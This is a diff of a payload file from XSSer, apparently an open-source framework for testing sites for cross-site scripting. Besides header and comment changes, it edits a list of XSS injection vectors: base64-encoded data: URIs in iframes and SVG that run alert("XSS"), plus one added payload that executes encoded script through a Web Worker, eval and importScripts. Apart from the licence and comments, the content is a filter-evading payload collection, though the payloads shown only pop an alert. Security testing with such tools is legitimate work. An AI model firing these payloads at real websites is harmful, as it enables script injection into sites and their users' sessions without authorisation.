@@ -3,7 +3,7 @@ $Id$
 
 This file is part of the xsser project, http://xsser.sourceforge.net.
 
-Copyright (c) 2011/2012/2013 psy <root@lordepsylon.net> - <epsylon@riseup.net>
+Copyright (c) 2011/2012/2013/2014/2015 - <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -18,11 +18,8 @@ You should have received a copy of the GNU General Public License along
 with xsser; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-
-## XSSer.py @@ DCP vectors @@ psy
-#
-## This file contains different XSS vectors to inject in the Data Control Protocol (DCP).
-## If you have some new vectors, please email me to [root@lordepsylon.net - epsylon@riseup.net] and will be added to XSSer framework.
+## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
+## If you have some new vectors, please email me to [epsylon@riseup.net] and will be added to XSSer framework.
 ## Thats all.
 ###
 ## Happy Cross Hacking! ;)
@@ -32,8 +29,8 @@ DCPvectors = [
                   'browser' : """[Data Control Protocol Injection]""" },
 
 		{ 'payload' : """<iframe src="data:text/html;base64,JTNjc2NyaXB0JTNlYWxlcnQoIlhTUyIpO2hpc3RvcnkuYmFjaygpOyUzYy9zY3JpcHQlM2UiPjwv""",
-		  'browser' : """[Data Control Protocol Injection]"""},
-				
+		  'browser' : """[Data Control Protocol Injection]"""},	
+	
 		#{ 'payload' : """data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7aGlzdG9yeS5iYWNrKCk7PC9zY3JpcHQ+""",
                 #  'browser' : """[Data Control Protocol Injection]"""},
 
@@ -48,6 +45,9 @@ DCPvectors = [
 
 		#{ 'payload' : """data:text/html;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KFhTUykrQURzLWhpc3RvcnkuYmFjaygpK0FEc0FQQS0vc2Ny aXB0K0FENC0=""",
                 #  'browser' : """[Data Control Protocol Injection]""" },
+
+		{ 'payload' : """0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7aGlzdG9yeS5iYWNrKCk7PC9zY3JpcHQ+'))""",
+		  'browser' : """[Data Control Protocol Injection]"""},
 
 		{ 'payload' : """data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==""",
                   'browser' : """[Data Control Protocol Injection]""" }
